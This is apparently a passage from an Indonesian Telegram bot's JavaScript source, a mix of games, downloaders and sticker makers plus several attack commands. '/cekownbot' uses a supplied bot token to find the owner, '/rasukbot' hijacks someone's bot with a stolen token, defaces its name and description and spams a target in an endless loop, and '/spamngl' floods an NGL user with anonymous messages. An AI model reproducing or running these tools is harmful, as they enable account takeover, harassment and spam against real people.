                [{ text: "✅ Izinkan", callback_data: `allow_${groupId}` }, { text: "❌ Tolak", callback_data: `deny_${groupId}` }]
              ]
            }
          }
        );
      } catch {}
    }
  } catch (err) {
    console.log("AntiCulik error:", err);
  }
});

bot.action(/(allow|deny)_(.+)/, async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true });

  const action = ctx.match[1];
  const groupId = Number(ctx.match[2]);
  const data = state.pendingGroups?.get(groupId);

  try { await ctx.deleteMessage(); } catch {}

  if (action === "allow") {
    state.pendingGroups?.delete(groupId);
    await ctx.reply("✅ Bot diizinkan");
    try { await ctx.telegram.sendMessage(groupId, "✅ Bot diizinkan oleh owner"); } catch {}
  }

  if (action === "deny") {
    state.pendingGroups?.delete(groupId);
    await ctx.reply("❌ Bot ditolak");
    try {
      await ctx.telegram.sendMessage(groupId, "❌ Bot ditolak oleh owner");
      if (data?.userId) await ctx.telegram.banChatMember(groupId, data.userId).catch(() => {});
      await ctx.telegram.leaveChat(groupId);
    } catch {}
  }
});

bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Format: /ssiphone 18:00|40|Indosat|can5y", { parse_mode: "Markdown" });

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) return ctx.reply("❌ Format: /ssiphone 18:00|40|Indosat|hai hai`", { parse_mode: "Markdown" });

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(carrier)}&messageText=${messageText}&emojiStyle=apple`;

  try {
    const res = await fetch(url);
    if (!res.ok) return ctx.reply("❌ Gagal mengambil data dari API.");

    const arrayBuffer = await res.arrayBuffer();
    const buffer = Buffer.from(arrayBuffer);

    await ctx.replyWithPhoto({ source: buffer }, { caption: "✅ Ss Iphone By Bang GXION", parse_mode: "Markdown" });
  } catch (e) {
    ctx.reply("Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("cekownbot", checkAllPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("Gunakan: /cekownbot BOT_TOKEN\n\nContoh:\n/cekownbot 123456:ABCDEF");

  const botToken = args.trim();

  try {
    const statusMsg = await ctx.reply("Mencari pemilik bot...");

    const botInfo = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`);
    if (!botInfo.data.ok) return ctx.reply("Token invalid!");

    const botUsername = botInfo.data.result.username;
    const botFirstName = botInfo.data.result.first_name;

    const updates = await axios.get(`https://api.telegram.org/bot${botToken}/getUpdates`, {
      params: { limit: 100, allowed_updates: ["message"] }
    });

    let ownerId = null;
    let ownerUsername = null;
    let ownerFullName = null;

    if (updates.data.result.length > 0) {
      for (const update of updates.data.result) {
        if (update.message && update.message.from) {
          const from = update.message.from;
          if (!from.is_bot) {
            ownerId = from.id;
            ownerUsername = from.username || "Tidak ada username";
            ownerFullName = `${from.first_name || ""} ${from.last_name || ""}`.trim() || "Tidak ada nama";
            break;
          }
        }
      }
    }

    if (!ownerId) {
      await ctx.telegram.editMessageText(
        chatId,
        statusMsg.message_id,
        undefined,
        `Tidak ada riwayat chat ditemukan.\n\nCara dapatkan ID pemilik:\n1. Kirim /start ke bot @${botUsername}\n2. Jalankan ulang /cekownbot ${botToken}\n\nAtau cek manual di @BotFather\n/mybots > pilih bot > API Token\n\nInfo bot:\nNama: ${botFirstName}\nUsername: @${botUsername}\nToken: ${botToken}`
      );
      return;
    }

    await ctx.telegram.editMessageText(
      chatId,
      statusMsg.message_id,
      undefined,
      `----------------------------------------\n     PEMILIK TOKEN BOT DITEMUKAN\n----------------------------------------\n\nPemilik : @${ownerUsername}\nNama Lengkap : ${ownerFullName}\nID Pemilik : ${ownerId}\nToken Bot : ${botToken}\nUsername Bot : @${botUsername}\nNama Bot : ${botFirstName}\n\n----------------------------------------\nDitemukan oleh System\n----------------------------------------`
    );
  } catch (err) {
    await ctx.reply("Error: " + err.message);
  }
});

bot.command("rasukbot", checkAllPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!args || !args.includes("|")) return ctx.reply("Gunakan: /rasukbot TOKEN_BOT|ID_USER\n\nContoh:\n/rasukbot 123456:ABCDEF|678901234");

  const [botToken, targetUserId] = args.split("|").map(s => s.trim());
  if (!botToken || !targetUserId || isNaN(targetUserId)) return ctx.reply("Format salah! Token|ID");

  try {
    const statusMsg = await ctx.reply("🔍 Scanninh token bot dan database api telegram...");

    const botInfo = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`);
    if (!botInfo.data.ok) return ctx.reply("Token invalid!");

    const username = botInfo.data.result.username;
    const firstName = botInfo.data.result.first_name;

    let targetName = "User";
    try {
      const userInfo = await ctx.telegram.getChat(targetUserId);
      targetName = userInfo.first_name || "User";
    } catch {}

    const channelLink = "t.me/durov";

    await axios.post(`https://api.telegram.org/bot${botToken}/setMyName`, { name: `MargaLuAMPASngentoddd` });
    await axios.post(`https://api.telegram.org/bot${botToken}/setMyDescription`, { description: `Bot ini telah diambil alih!\nRasuk By: ${targetName} (${targetUserId})\nJoin: ${channelLink}` });
    await axios.post(`https://api.telegram.org/bot${botToken}/setMyCommands`, { commands: [{ command: "start", description: "Mulai" }, { command: "help", description: "Bantuan" }] });
    await axios.post(`https://api.telegram.org/bot${botToken}/deleteWebhook`);

    await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, `✅ BOT @${username} SUKSES DIRASUK!\nTarget: ${targetName}\n\n📨 Spam executed...`);

    let sent = 0;
    const messages = ["BOT INI SUDAH DIRASUK!", `Owner: ${targetName}`, `Join: ${channelLink}`, "BOT LU AMPAS!"];

    while (true) {
      try {
        const msg = messages[Math.floor(Math.random() * messages.length)];
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          chat_id: targetUserId,
          text: `${msg}\n\n🔗 JOIN: ${channelLink}`,
          reply_markup: { inline_keyboard: [[{ text: "📢 JOIN", url: `https://${channelLink}` }]] }
        });
        sent++;

        if (sent % 10 === 0) {
          await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, `✅ BOT @${username} SUKSES DIRASUK!\nTarget: ${targetName}\n📨 Spam: ${sent}/∞`);
        }

        await new Promise(resolve => setTimeout(resolve, 100));
      } catch (err) {
        if (err.response?.status === 429) {
          const wait = err.response.data.parameters?.retry_after || 5;
          await new Promise(resolve => setTimeout(resolve, wait * 1000));
        } else if (err.response?.status === 403) {
          await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, `⚠️ Bot di-block target!\nTotal spam: ${sent}`);
          break;
        } else {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }
    }
  } catch (err) {
    await ctx.reply(`Error: ${err.message}`);
  }
});

bot.command("time", async (ctx) => {
  const now = new Date();
  const wib = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
  const wita = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Makassar" }));
  const wit = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jayapura" }));

  const formatJam = (date) => date.toLocaleTimeString("id-ID", { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false });
  const formatTanggal = (date) => date.toLocaleDateString("id-ID", { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' });

  const pesan = `<blockquote>
🕐 WAKTU SEKARANG 🕐

┌─────────────────┐
│ 🟢 WIB 
│    ${formatJam(wib)}
│    ${formatTanggal(wib)}
├─────────────────┤
│ 🟡 WITA
│    ${formatJam(wita)}
│    ${formatTanggal(wita)}
├─────────────────┤
│ 🔵 WIT
│    ${formatJam(wit)}
│    ${formatTanggal(wit)}
└─────────────────┘

✨ Ketikan /start untuk kembali menu utama ✨
</blockquote>`;

  await ctx.reply(pesan, { parse_mode: "HTML" });
});

bot.command("cekidch", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  if (!input) return ctx.reply("Masukkan username channel.\nContoh: /cekidch @namachannel");

  try {
    const chat = await ctx.telegram.getChat(input);
    ctx.reply(`📢 ID Channel:\n${chat.id}`);
  } catch {
    ctx.reply("Channel tidak ditemukan atau bot belum menjadi admin.");
  }
});

const tebakAngkaGames = {};
const triviaGames = {};
const typingGames = {};
const mathGames = {};
const tebakKataGames = {};
const reactionGames = {};

const triviaData = [
  { q: 'Ibukota Indonesia?', a: 'jakarta' },
  { q: '5 + 5 × 2 = ?', a: '15' },
  { q: 'Hewan tercepat di darat?', a: 'cheetah' },
  { q: 'Planet terbesar di tata surya?', a: 'jupiter' },
  { q: 'Warna pelangi ada berapa?', a: '7' },
  { q: 'Siapa penemu lampu?', a: 'thomas edison' },
  { q: '10² = ?', a: '100' },
  { q: 'Bulan berapa Indonesia merdeka?', a: '8' },
  { q: 'Air membeku di suhu? (celsius)', a: '0' },
  { q: 'Jumlah sisi segitiga?', a: '3' }
];

const kataList = ['javascript', 'telegram', 'whatsapp', 'indonesia', 'programming', 'developer', 'bot', 'coding', 'server', 'github'];

bot.command('tebakangka', async (ctx) => {
  const userId = ctx.from.id;
  const angka = Math.floor(Math.random() * 100) + 1;
  tebakAngkaGames[userId] = { angka, nyawa: 5, start: Date.now() };
  await ctx.reply('🎯 *TEBAK ANGKA*\n\nAku punya angka 1-100\nKamu punya 5 nyawa\n\nKetik angkanya aja!', { parse_mode: 'Markdown' });
});

bot.command('trivia', async (ctx) => {
  const userId = ctx.from.id;
  const soal = triviaData[Math.floor(Math.random() * triviaData.length)];
  triviaGames[userId] = { jawaban: soal.a, start: Date.now(), total: 0 };
  await ctx.reply(`🧠 *TRIVIA CEPAT*\n\n📝 ${soal.q}\n\n⏱ Jawab secepat mungkin!`, { parse_mode: 'Markdown' });
});

bot.command('slot', async (ctx) => {
  const emojis = ['🍒', '🍋', '🔔', '⭐', '7️⃣', '💎'];
  const s1 = emojis[Math.floor(Math.random() * emojis.length)];
  const s2 = emojis[Math.floor(Math.random() * emojis.length)];
  const s3 = emojis[Math.floor(Math.random() * emojis.length)];

  let hasil = '';
  if (s1 === s2 && s2 === s3) hasil = '🎉 JACKPOT!';
  else if (s1 === s2 || s2 === s3 || s1 === s3) hasil = '👏 Hampir!';
  else hasil = '😔 Coba lagi';

  await ctx.reply(`🎰 *SLOT MACHINE*\n\n┌───────────┐\n│ ${s1}  ${s2}  ${s3} │\n└───────────┘\n\n${hasil}`, { parse_mode: 'Markdown' });
});

bot.command('dadu', async (ctx) => {
  const dadu = Math.floor(Math.random() * 6) + 1;
  const emojiDadu = ['', '⚀', '⚁', '⚂', '⚃', '⚄', '⚅'];
  await ctx.reply(`🎲 *LEMPAR DADU*\n\n${emojiDadu[dadu]}  Angka: ${dadu}`, { parse_mode: 'Markdown' });
});

bot.command('suit', async (ctx) => {
  await ctx.reply('✊✋✌️ *SUIT!*\n\nPilih:\n/batu\n/kertas\n/gunting', { parse_mode: 'Markdown' });
});

bot.command(['batu', 'kertas', 'gunting'], async (ctx) => {
  const pilihan = { batu: 0, kertas: 1, gunting: 2 };
  const emojiPilihan = ['✊ Batu', '✋ Kertas', '✌️ Gunting'];
  const user = pilihan[ctx.message.text.replace('/', '')];
  const bot = Math.floor(Math.random() * 3);

  let hasil = '';
  if (user === bot) hasil = '🤝 SERI!';
  else if ((user === 0 && bot === 2) || (user === 1 && bot === 0) || (user === 2 && bot === 1)) hasil = '🎉 KAMU MENANG!';
  else hasil = '😔 KAMU KALAH!';

  await ctx.reply(`✊✋✌️ *SUIT!*\n\nKamu: ${emojiPilihan[user]}\nBot: ${emojiPilihan[bot]}\n\n${hasil}`, { parse_mode: 'Markdown' });
});

bot.command('typing', async (ctx) => {
  const userId = ctx.from.id;
  const kata = ['cepat', 'lambat', 'kucing', 'makan', 'tidur', 'lari', 'terbang', 'renang', 'diam', 'bicara'];
  const random = kata[Math.floor(Math.random() * kata.length)];
  typingGames[userId] = { kata: random, start: Date.now() };
  await ctx.reply(`⌨️ *TYPING SPEED*\n\nKetik kata ini secepat mungkin:\n\n*\`${random}\`*`, { parse_mode: 'Markdown' });
});

bot.command('math', async (ctx) => {
  const userId = ctx.from.id;
  const operators = ['+', '-', '×'];
  const op = operators[Math.floor(Math.random() * operators.length)];
  let a, b, jawaban;

  switch(op) {
    case '+': a = Math.floor(Math.random() * 100); b = Math.floor(Math.random() * 100); jawaban = a + b; break;
    case '-': a = Math.floor(Math.random() * 100); b = Math.floor(Math.random() * a); jawaban = a - b; break;
    case '×': a = Math.floor(Math.random() * 20) + 1; b = Math.floor(Math.random() * 10) + 1; jawaban = a * b; break;
  }

  mathGames[userId] = { jawaban, start: Date.now(), soal: `${a} ${op} ${b}` };
  await ctx.reply(`🔢 *MATH RACE*\n\n${a} ${op} ${b} = ?\n\nJawab dengan angka!`, { parse_mode: 'Markdown' });
});

bot.command('tebakkata', async (ctx) => {
  const userId = ctx.from.id;
  const kata = kataList[Math.floor(Math.random() * kataList.length)];
  const masked = '_ '.repeat(kata.length).trim();
  tebakKataGames[userId] = { kata, tebakan: [], nyawa: 5 };
  await ctx.reply(`📝 *TEBAK KATA*\n\n\`${masked}\`\n\n❤️ Nyawa: 5\nKetik hurufnya!`, { parse_mode: 'Markdown' });
});

bot.command('koin', async (ctx) => {
  const hasil = Math.random() < 0.5 ? '🪙 KEPALA' : '🪙 EKOR';
  await ctx.reply(`🪙 *FLIP COIN*\n\n...mengocok...\n\n${hasil}`, { parse_mode: 'Markdown' });
});

bot.command('reaction', async (ctx) => {
  const userId = ctx.from.id;
  const delay = Math.floor(Math.random() * 3000) + 1000;
  await ctx.reply('⚡ *REACTION SPEED*\n\nTunggu sinyal...', { parse_mode: 'Markdown' });

  setTimeout(async () => {
    reactionGames[userId] = Date.now();
    await ctx.reply('🔴 *SEKARANG!*\n\nBalas pesan ini secepat mungkin!', { parse_mode: 'Markdown' });
  }, delay);
});

bot.on('text', async (ctx, next) => {
  const userId = ctx.from.id;
  const text = ctx.message.text;

  if (tebakAngkaGames[userId]) {
    const game = tebakAngkaGames[userId];
    const tebakan = parseInt(text);
    if (!isNaN(tebakan)) {
      game.nyawa--;
      if (tebakan === game.angka) {
        const waktu = ((Date.now() - game.start) / 1000).toFixed(1);
        delete tebakAngkaGames[userId];
        return ctx.reply(`🎉 *BENAR!*\n\nAngka: ${game.angka}\nWaktu: ${waktu} detik\nSisa nyawa: ${game.nyawa}`, { parse_mode: 'Markdown' });
      }
      if (game.nyawa <= 0) {
        delete tebakAngkaGames[userId];
        return ctx.reply(`💀 *GAME OVER*\n\nAngkanya: ${game.angka}`, { parse_mode: 'Markdown' });
      }
      const hint = tebakan < game.angka ? '⬆️ Lebih besar' : '⬇️ Lebih kecil';
      return ctx.reply(`${hint}\n❤️ Nyawa: ${game.nyawa}`);
    }
  }

  if (triviaGames[userId]) {
    const game = triviaGames[userId];
    const jawab = text.toLowerCase().trim();
    game.total++;
    if (jawab === game.jawaban) {
      const waktu = ((Date.now() - game.start) / 1000).toFixed(1);
      const score = Math.max(0, 100 - Math.floor(waktu * 10));
      delete triviaGames[userId];
      return ctx.reply(`✅ *BENAR!*\n\n⏱ ${waktu} detik\n⭐ Score: +${score}`, { parse_mode: 'Markdown' });
    }
    if (game.total >= 3) {
      delete triviaGames[userId];
      return ctx.reply(`❌ *SALAH*\n\nJawaban: ${game.jawaban}`, { parse_mode: 'Markdown' });
    }
    return ctx.reply(`❌ Salah! Coba lagi (${3 - game.total}x kesempatan)`);
  }

  if (typingGames[userId]) {
    const game = typingGames[userId];
    if (text.toLowerCase() === game.kata) {
      const waktu = ((Date.now() - game.start) / 1000).toFixed(2);
      const wpm = ((game.kata.length / waktu) * 12).toFixed(0);
      delete typingGames[userId];
      return ctx.reply(`⚡ *TEPAT!*\n\n⏱ ${waktu} detik\n⌨️ ${wpm} WPM`, { parse_mode: 'Markdown' });
    }
  }

  if (mathGames[userId]) {
    const game = mathGames[userId];
    const jawab = parseInt(text);
    if (!isNaN(jawab)) {
      if (jawab === game.jawaban) {
        const waktu = ((Date.now() - game.start) / 1000).toFixed(1);
        delete mathGames[userId];
        return ctx.reply(`🎯 *BENAR!*\n\n${game.soal} = ${game.jawaban}\n⏱ ${waktu} detik`, { parse_mode: 'Markdown' });
      }
      return ctx.reply('❌ Salah! Coba lagi');
    }
  }

  if (tebakKataGames[userId]) {
    const game = tebakKataGames[userId];
    const huruf = text.toLowerCase();
    if (huruf.length === 1) {
      if (game.tebakan.includes(huruf)) return ctx.reply('⚠️ Huruf sudah ditebak!');
      game.tebakan.push(huruf);
      if (!game.kata.includes(huruf)) {
        game.nyawa--;
        if (game.nyawa <= 0) {
          delete tebakKataGames[userId];
          return ctx.reply(`💀 *GAME OVER*\n\nKatanya: ${game.kata}`, { parse_mode: 'Markdown' });
        }
      }
      const masked = game.kata.split('').map(h => game.tebakan.includes(h) ? h : '_').join(' ');
      if (!masked.includes('_')) {
        delete tebakKataGames[userId];
        return ctx.reply(`🎉 *MENANG!*\n\nKatanya: ${game.kata}`, { parse_mode: 'Markdown' });
      }
      return ctx.reply(`\`${masked}\`\n❤️ ${game.nyawa}`, { parse_mode: 'Markdown' });
    }
  }

  if (reactionGames[userId]) {
    const waktu = ((Date.now() - reactionGames[userId]) / 1000).toFixed(3);
    delete reactionGames[userId];
    let rating = '';
    if (waktu < 0.3) rating = '🔥 GODLIKE!';
    else if (waktu < 0.5) rating = '⚡ SANGAT CEPAT!';
    else if (waktu < 1.0) rating = '👍 CEPAT!';
    else if (waktu < 2.0) rating = '🙂 BIASA AJA';
    else rating = '🐌 LELET!';
    return ctx.reply(`⏱ ${waktu} detik\n${rating}`);
  }

  return next();
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.zenzxz.my.id/maker/brat?text=${encodeURIComponent(text)}`;
    const res = await axios.get(apiURL, { responseType: "arraybuffer" });
    await ctx.replyWithSticker({ source: Buffer.from(res.data) });
  } catch (e) {
    ctx.reply("❌ API error / tidak tersedia.");
  }
});

bot.command("spamngl", async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1);
    if (args.length < 1) return ctx.reply("🪧 ☇ Format: /spamngl rainonesday 10");

    const username = args[0];
    const amount = parseInt(args[1], 10);
    const delay = 200;

    if (isNaN(amount) || amount < 1) return ctx.reply("❌ ☇ Masukan jumlah dan harus berupa angka");

    await ctx.reply(`⏳ ☇ Mengirim ${amount} pesan spam ke ${username}`);

    for (let i = 1; i <= amount; i++) {
      try {
        const deviceId = crypto.randomBytes(21).toString("hex");
        const message = "WOI DONGO KENAL VINA GA??";
        const body = `username=${username}&question=${encodeURIComponent(message)}&deviceId=${deviceId}`;

        await fetch("https://ngl.link/api/submit", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
          body,
        });
      } catch {}

      if (i < amount) {
        await new Promise((r) => setTimeout(r, i % 50 === 0 ? delay + 200 : delay));
      }
    }

    ctx.reply(`✅ ☇ Selesai mengirim ${amount} pesan spam ke ${username}`);
  } catch (error) {
    ctx.reply("❌ ☇ Gagal menghubungi api, oba lagi nanti");
  }
});

bot.command("snack", async (ctx) => {
  const url = ctx.message.text.split(" ")[1];
  if (!url) return ctx.reply("Contoh:\n/snack https://s.snackvideo.com/xxxx");
  if (!url.includes("snackvideo")) return ctx.reply("❌ Itu bukan link SnackVideo, jangan ngawur");

  try {
    await ctx.reply("⏳ Lagi diproses... sabar dikit napa");

    const res = await axios.get(`https://api.shecodes.io/snackvideo?url=${encodeURIComponent(url)}`, { timeout: 15000 });
    const video = res?.data?.data?.video;

    if (!video) return ctx.reply("❌ Gagal ambil video, kemungkinan API nya lagi ngambek");

    await ctx.replyWithVideo({ url: video }, { caption: "✅ Beres. Udah, jangan spam lagi" });
  } catch (err) {
    ctx.reply("❌ Error. Bisa jadi:\n- API mati\n- Link lu aneh\n- Internet lu kentang");
  }
});

bot.command(/\/gethtml(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = (match[1] || "").trim();

  if (!url || !/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "🔗 *Masukkan domain atau URL yang valid!*\n\nContoh:\n`/gethtml https://example.com`", { parse_mode: "Markdown" });
  }

  try {
    await bot.sendMessage(chatId, "⏳ Mengambil source code dari URL...");
    const res = await axios.get(url, { responseType: "text", timeout: 30000 });
    const html = res.data;
    const filePath = path.join(__dirname, "source_code.html");
    fs.writeFileSync(filePath, html);
    await bot.sendDocument(chatId, filePath, {}, { filename: "source_code.html", contentType: "text/html" });
    fs.unlinkSync(filePath);
  } catch (err) {
    bot.sendMessage(chatId, `❌ *Terjadi kesalahan:*\n\`${err.message}\``, { parse_mode: "Markdown" });
  }
});

const { exec } = require("child_process");

bot.command("check", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply?.document) return ctx.reply(`╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n┃      JAVASCRIPT ANALYZER      ┃\n╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n📤 Please reply to a JavaScript file\n\n📌 Example:\n1. Send file.js\n2. Reply file tersebut\n3. Ketik /check\n\n━━━━━━━━━━━━━━━━━━━━━━\n\n⏳ Waiting for file...`);

    const file = reply.document;
    if (!file.file_name.endsWith(".js")) return ctx.reply(`❌ Invalid File\n\nOnly JavaScript (.js) files are supported.`);

    const scanMsg = await ctx.reply(`⌜ JAVASCRIPT ANALYZER ⌟\n╎ File      : ${file.file_name}\n╎ Status    : Scanning...\n╎ Engine    : Node.js Checker\n╰╌╌╌╌╌╌╌╌╌╌⌯\n\n🔍 Analyzing JavaScript file...`);

    const fileInfo = await ctx.telegram.getFile(file.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${fileInfo.file_path}`;
    const tempFile = `./check_${Date.now()}.js`;

    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    fs.writeFileSync(tempFile, response.data);

    exec(`node --check "${tempFile}"`, async (err, stdout, stderr) => {
      if (fs.existsSync(tempFile)) fs.unlinkSync(tempFile);

      if (err) {
        return ctx.reply(`⌜ JAVASCRIPT ANALYZER ⌟\n╎ File      : ${file.file_name}\n╎ Result    : Failed\n╎ Issues    : Detected\n╰╌╌╌╌╌╌╌╌╌╌⌯\n\n❌ Syntax Error Found\n\n${stderr.slice(0, 3000)}`);
      }

      return ctx.reply(`⌜ JAVASCRIPT ANALYZER ⌟\n╎ File      : ${file.file_name}\n╎ Result    : Passed\n╎ Issues    : 0\n╰╌╌╌╌╌╌╌╌╌╌⌯\n\n✅ YEAYY CODE FILE.JS ANDA AMAN!!!`);
    });
  } catch (e) {
    ctx.reply(`⌜ JAVASCRIPT ANALYZER ⌟\n╎ Result : Failed\n╰╌╌╌╌╌╌╌╌╌╌⌯\n\n❌ Failed to check file\n\n${e.message}`);
  }
});

bot.command("cekfunction", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply?.text) return ctx.reply(`🪧 Contoh: kirim function nya lalu reply code function dengan /cekfunction`);

    const code = reply.text;

    try {
      new Function(code);
      return ctx.reply(`✅ YEAY FUNCTION AMAN\n Created By : @Bawzzhhh`);
    } catch (err) {
      let errorLine = "Tidak diketahui";
      let errorCode = "Tidak ditemukan";

      const match = err.stack?.match(/<anonymous>:(\d+):(\d+)/);
      if (match) {
        const line = parseInt(match[1]) - 1;
        const lines = code.split("\n");
        if (lines[line]) {
          errorLine = line + 1;
          errorCode = lines[line];
        }
      }

      return ctx.reply(
`━━━━━━━━━━━━━━━━━━
🧪 FUNCTION CHECK
━━━━━━━━━━━━━━━━━━
❌ STATUS : ERROR PADA FUNCTION
📍 BARIS ERROR : ${errorLine}
🔎 ERROR INFORMATION :
${err.message}
• KODE FUNCTION YANG BERMASALAH :
\`\`\`js
${errorCode}
\`\`\`
━━━━━━━━━━━━━━━━━━`,
        { parse_mode: "Markdown" }
      );
    }
  } catch (e) {
    ctx.reply("❌ Gagal cek function.");
  }
});

bot.command("catbox", async (ctx) => {
  const url = ctx.message.text.split(" ")[1];
  if (!url) return ctx.reply(`📥 *DOWNLOAD CATBOX* 📥\n\n*Cara pakai:*\n/catbox https://files.catbox.moe/xxxxx.jpg\n\n*Support file:*\nGambar, Video, Audio, Dokumen\n\n📌 *Maksimal file: 50MB*`, { parse_mode: "Markdown" });
  if (!url.includes('files.catbox.moe')) return ctx.reply("❌ Bukan URL Catbox yang valid!", { parse_mode: "Markdown" });

  await ctx.reply("⏳ *Mengunduh file...*", { parse_mode: "Markdown" });

  try {
    const ext = url.split('.').pop().toLowerCase();

    if (['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext)) {
      await ctx.replyWithPhoto(url, { caption: "✅ *Download berhasil!*", parse_mode: "Markdown" });
    } else if (['mp4', 'mkv', 'avi', 'mov'].includes(ext)) {
      await ctx.replyWithVideo(url, { caption: "✅ *Download berhasil!*", parse_mode: "Markdown" });
    } else if (['mp3', 'wav', 'ogg'].includes(ext)) {
      await ctx.replyWithAudio(url, { caption: "✅ *Download berhasil!*", parse_mode: "Markdown" });
    } else {
      await ctx.replyWithDocument(url, { caption: "✅ *Download berhasil!*", parse_mode: "Markdown" });
    }
  } catch {
    ctx.reply("❌ Gagal mengunduh file! Pastikan URL valid.", { parse_mode: "Markdown" });
  }
});

bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: { "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36", "accept": "application/json,text/plain,*/*", "referer": "https://tikwm.com/" },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data) return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return { type: "photo", media: { source: Buffer.from(res.data) } };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: { "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36" },
      timeout: 30000
    });

    await ctx.replyWithVideo({ source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` }, { supports_streaming: true });
  } catch (e) {
    const err = e?.response?.status ? `❌ Error ${e.response.status} saat mengunduh video` : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("cekmasadepan", async (ctx) => {
  let targetName = "Kamu";

  if (ctx.message.reply_to_message) {
    targetName = ctx.message.reply_to_message.from.first_name || "Dia";
  } else {
    const args = ctx.message.text.split(" ");
    if (args.length > 1) targetName = args.slice(1).join(" ");
  }

  const profesi = ["Programmer Handal 💻", "Pengusaha Sukses 🏢", "Dokter Hebat 🏥", "YouTuber Terkenal 📹", "Polisi Berdedikasi 👮", "Guru Inspiratif 📚", "Artis Ternama 🎬", "Atlet Profesional 🏆", "Pilot Handal ✈️", "Chef Michelin 🍳", "Desainer Grafis 🎨", "Wirausaha Muda 🚀"];
  const kekayaan = ["Miliarder 💰💰💰", "Mapan Banget 🏦", "Berkecukupan 💵", "Kaya Raya 👑", "Sukses Finansial 📈", "Harta Melimpah 💎", "Hidup Nyaman 🏠", "Tabungan Banyak 🏦"];
  const jodoh = ["Cantik/Ganteng 💕", "Setia ❤️", "Pengertian 🌸", "Lucu dan Romantis 🥰", "Baik Hati 💗", "Sederhana Tapi Bahagia 😊", "Kaya Raya 💰", "Soulmate Sejati ✨", "Pendamping Hidup 🤵"];
  const rumah = ["Mewah di Jakarta 🏰", "Minimalis di Bali 🏡", "Modern di Bandung 🏘️", "Nyaman di Kampung 🌳", "Villa di Puncak ⛰️", "Apartemen di Surabaya 🏙️", "Rumah Impian ✨", "Kontrakan Dulu 😅"];
  const kendaraan = ["Pajero Sport 🚙", "Alphard Hitam 🚐", "Tesla Listrik ⚡", "Motor Matic aja 🛵", "BMW Mewah 🚗", "Mercedes Benz 🏎️", "Helikopter Pribadi 🚁", "Naik Angkot 😂"];
  const nasib = ["Sukses Besar! 🎉", "Hidup Bahagia 😊", "Menjadi Orang Tua Sukses 👨‍👩‍👧", "Pensiun Muda 🏖️", "Hidup Sederhana Bahagia 🌿", "Jadi Inspirasi Banyak Orang ✨", "Hidup Berkah 🙏", "Terkenal Seantero Negeri 🌍"];

  const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];

  const pesan = `<blockquote>
🔮 RAMALAN MASA DEPAN 🔮
Untuk: ${targetName}
━━━━━━━━━━━━━━━━━━━━━━
👔 Profesi: ${pick(profesi)}
